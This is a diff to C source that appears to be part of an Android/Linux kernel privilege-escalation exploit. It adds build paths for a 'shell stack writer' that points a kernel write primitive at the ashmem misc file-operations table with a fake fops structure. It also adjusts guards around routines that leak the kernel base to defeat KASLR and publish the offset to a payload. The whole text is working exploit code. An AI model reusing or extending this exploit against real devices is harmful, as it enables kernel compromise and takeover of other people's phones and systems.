@@ -1103,7 +1103,8 @@ uint64_t slide_child_leak_stext(void) {
   return slide_read_stext();
 }
 
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+#if (defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE) || \
+    (defined(SHELL_STACK_WRITER) && SHELL_STACK_WRITER)
 static int slide_child_trigger_write(void) {
   pthread_t waiter;
   pthread_t owner;
@@ -1170,6 +1171,20 @@ static int slide_trigger_physical_state(void) {
   pr_info("p0 physical write status=%d ok=%d\n", status, ok);
   return ok;
 }
+
+#if defined(SHELL_STACK_WRITER) && SHELL_STACK_WRITER
+int shell_trigger_fops_stack_route(void) {
+  slide_oracle_parent = fake_fops;
+  slide_oracle_target = data_addr(ASHMEM_MISC_FOPS);
+  pr_info("shell fops stack route writer=%d parent=%016zx target=%016zx lock=%016zx\n",
+          SLIDE_STACK_WRITER, slide_oracle_parent, slide_oracle_target,
+          fake_lock);
+  return slide_trigger_physical_state();
+}
+#endif
+#endif
+
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 
 #if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
 static const int slide_physical_slot_delays[] = {
@@ -1286,6 +1301,7 @@ int app_trigger_fops_oracle_slot(size_t slot) {
   return app_trigger_fops_slide_slot(slot);
 }
 #endif
+
 #else
 int app_trigger_fops_slide_route(void) {
   static size_t delay_index;
@@ -1719,7 +1735,9 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
   kaslr_slide = slide;
   slide_p0_offset = slide;
   kaslr_done = 1;
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
   app_publish_p0_offset(slide_p0_offset);
+#endif
   pr_success("slide-kaslr-ok source=%s pid=%d base=%016llx "
              "slide=%016llx\n",
              source, getpid(), (unsigned long long)kaslr_base,
@@ -1729,6 +1747,7 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
 
 
 
+#if !defined(SHELL_TRACEFS_SLIDE) || !SHELL_TRACEFS_SLIDE
 int slide_leak_kernel_base(void) {
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
@@ -1890,3 +1909,4 @@ int slide_leak_kernel_base(void) {
   return 0;
 #endif
 }
+#endif
